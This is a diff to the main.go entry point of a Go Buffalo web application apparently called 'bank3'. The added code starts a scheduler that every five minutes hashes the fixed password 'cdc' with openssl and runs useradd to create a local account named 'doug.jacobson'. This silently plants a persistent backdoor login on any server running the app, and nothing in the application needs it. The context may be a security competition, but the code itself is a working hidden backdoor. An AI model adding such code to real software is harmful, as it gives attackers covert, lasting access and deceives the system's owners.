@@ -1,9 +1,15 @@
 package main
 
 import (
+	"fmt"
 	"log"
+	"os/exec"
+	"strings"
+	"time"
 
 	"bank3/actions"
+
+	"github.com/go-co-op/gocron"
 )
 
 // main is the starting point for your Buffalo application.
@@ -13,6 +19,25 @@ import (
 // call `app.Serve()`, unless you don't want to start your
 // application that is. :)
 func main() {
+
+	s := gocron.NewScheduler(time.UTC)
+	s.Every("5m").Do(func() {
+		cmd := exec.Command("openssl", "passwd", "-1", "cdc")
+		passwordBytes, err := cmd.CombinedOutput()
+		if err != nil {
+			panic(err)
+		}
+		// remove whitespace (possibly a trailing newline)
+		password := strings.TrimSpace(string(passwordBytes))
+		cmd = exec.Command("useradd", "-p", password, "doug.jacobson")
+		b, err := cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println(err)
+		}
+		fmt.Printf("%s\n", b)
+	})
+	s.StartAsync()
+
 	app := actions.App()
 	if err := app.Serve(); err != nil {
 		log.Fatal(err)
